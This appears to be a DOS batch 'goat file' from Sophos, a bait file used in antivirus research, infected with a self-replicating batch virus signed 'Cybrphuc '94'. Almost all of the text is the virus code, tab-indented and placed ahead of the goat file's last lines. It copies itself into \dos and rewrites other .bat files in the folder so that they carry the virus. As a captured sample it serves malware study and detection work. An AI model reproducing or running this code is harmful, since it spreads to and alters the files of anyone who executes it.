	goto #@2
	:#@1
	type %0.bat|find "	">#pg94.~
	if exist \dos\*.* if not exist \dos\#pg94.~ copy #pg94.~ \dos>nul
	:#@2
	set #=h
	if `%#%==` goto #@0
		if `%#%==` goto #@3
type %0.bat|find "		">#pg94.bat
		:#@3
	set #=
	for %%p in (*.bat) do call #PG94 %%p %0
	goto #@0
		if not exist %1 goto #@4
		for %%g in (%0.BAT,%2.B?T) do if %%g==%1 goto #@4
		type %1|find/v "	">#pg94.~~
		type #pg94.~>%1
		type #pg94.~~>>%1
		:#@4
	:#@0
	if exist #pg94.* del #pg94.*
	break on
	
rem			Ha ha ha!  Cybrphuc '94
	
	echo on
@echo off
echo This is a Sophos Plc batch goat file
